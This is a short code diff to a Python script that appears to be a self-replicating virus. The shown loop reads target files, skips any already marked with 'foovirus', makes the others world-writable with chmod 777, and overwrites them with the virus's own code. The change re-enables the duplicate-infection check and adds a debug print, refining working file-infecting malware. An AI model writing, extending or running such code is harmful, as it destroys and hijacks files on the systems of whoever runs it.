@@ -120,7 +120,8 @@ while True:
                         IN = open(item, 'r')
                         all_of_it = IN.readlines()
                         IN.close()
-                        # if any('foovirus' in line for line in all_of_it): continue
+                        print(all_of_it)
+                        if any('foovirus' in line for line in all_of_it): continue
                         os.chmod(item, 0o777)
                         OUT = open(item, 'w')
                         OUT.writelines(virus)
